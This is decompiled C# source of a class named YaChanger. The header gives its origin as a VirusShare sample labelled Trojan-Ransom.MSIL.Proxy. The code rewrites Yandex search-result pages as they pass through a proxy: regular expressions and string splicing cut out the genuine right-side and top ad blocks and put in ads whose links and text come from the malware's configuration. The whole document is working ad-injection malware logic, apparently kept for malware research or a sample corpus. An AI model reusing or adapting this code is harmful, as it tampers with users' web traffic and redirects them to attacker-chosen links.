// Decompiled with JetBrains decompiler
// Type: ProxyService.YaChanger
// Assembly: ProxyService, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8A4756A5-2150-40F9-90C4-9A8E485808F2
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.MSIL.Proxy.a-49083ed967969788acc63c6c38a22377a353de59b937fe8ca52b9aa5daac13cb.exe

using System.Text.RegularExpressions;

namespace ProxyService
{
  internal class YaChanger
  {
    private readonly XmlHelper.YaAdBlock _adRight;
    private readonly XmlHelper.YaAdBlock _adBlockTop;

    private string BuildRightAd() => string.Format("<div class=\"b-adv__line\"><div class=\"b-adv__title\"><a href=\"{0}\" target=_blank>{1}</a></div>{2}<div class=\"b-serp-url\"><span class = \"b-serp-url__item\">{3}</span><i class=\"b-wbr\"></i></div></div>", (object) this._adRight.Direct, (object) this._adRight.Titile, (object) this._adRight.Text, (object) this._adRight.Link);

    private string BuildMainAd() => string.Format("\r\n                <div class=\"b-spec-adv__item b-serp-item\"><h2 class=\"b-serp-item__title\"><a class=\"b-serp-item__title-link\" href=\"{0}\" target=\"_blank\"><span>{1}</span></a></h2><div class=\"b-serp-item__text\">{2}</div><div class=\"b-serp-item__links\"><div class=\"b-serp-url\"><span class=\"b-serp-url__item\"{3}</span></div></div></div><div class=\"b-spec-adv__item b-serp-item\"><h2 class=\"b-serp-item__title\"></div>\r\n            ", (object) this._adBlockTop.Link, (object) this._adBlockTop.Titile, (object) this._adBlockTop.Text, (object) this._adBlockTop.Link);

    public YaChanger(XmlHelper.YaAdBlock adRight, XmlHelper.YaAdBlock adTop)
    {
      this._adRight = adRight;
      this._adBlockTop = adTop;
    }

    public string ChangeRight(string code) => new Regex("<div class=.b-adv.>[\\s\\n]*<div class=.b-adv__head.>[\\w\\W]*?</div>[\\s\\n]*(?<adBlock>(<div class=.b-adv__line.>[\\s\\n]*?<div class=.b-adv__title.>[\\w\\W]*?</div>[\\n\\s]*</div>[\\n\\s]*</div>[\\s\\n]*</div>[\\s\\n]*)+)").Replace(code, new MatchEvaluator(this.Evaluator));

    public string ChangeTop(string code)
    {
      string str1 = "<div class=\"b-spec-adv g-gap-vertical g-gap-horizontal\"><div class=\"b-spec-adv__list b-serp-list\">";
      string str2 = "</div></div><a class=\"b-link b-spec-adv__direct b-sprite\"";
      int num = code.IndexOf(str1);
      int startIndex = code.IndexOf(str2);
      return code.Substring(0, num + str1.Length) + this.BuildMainAd() + code.Substring(startIndex, code.Length - startIndex);
    }

    private string Changer(Match match) => match.Value.Replace(match.Groups["ad"].Value, this.BuildMainAd());

    private string Evaluator(Match match) => match.Value.Replace(match.Groups["adBlock"].Value, this.BuildRightAd());
  }
}
